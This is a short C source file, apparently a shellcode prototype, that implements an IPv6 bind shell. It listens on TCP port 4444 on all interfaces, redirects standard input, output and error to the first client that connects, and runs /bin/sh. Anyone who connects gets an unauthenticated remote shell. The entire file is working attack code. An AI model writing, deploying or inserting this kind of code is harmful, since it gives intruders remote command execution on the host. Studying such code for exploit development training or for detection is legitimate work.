#include <stdio.h>  
#include <sys/types.h>   
#include <sys/socket.h>  
#include <netinet/in.h>  
  
int i;

// sockfd for host 
int host_sockfd;    

// sockfd for client  					   
int client_sockfd;                       
  
// sockaddr_in6 struct    
struct sockaddr_in6 host_addr;              
  
int main()  
{  
    //Create a socket  
    host_sockfd = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);  
  
    //Initialize sockaddr struct for bind socket
    host_addr.sin6_family = AF_INET6;  
    host_addr.sin6_port = htons(4444);  
    host_addr.sin6_addr = in6addr_any; 
  
    //Bind socket 
    bind(host_sockfd, (struct sockaddr*) &host_addr, sizeof(host_addr));  
      
    //I am listening for connections
    listen(host_sockfd, 2);  
  
    //Just accept incoming connection  
    client_sockfd = accept(host_sockfd, NULL, NULL);  
  
	//Duplicate file descriptors for STDIN, STDOUT and STDERR
	for(i = 0; i <= 2; i++)
		dup2(client_sockfd, i);
  
    // Execute /bin/sh  
    execve("/bin/sh", NULL, NULL);  
    close(host_sockfd);  
      
    return 0;  
}
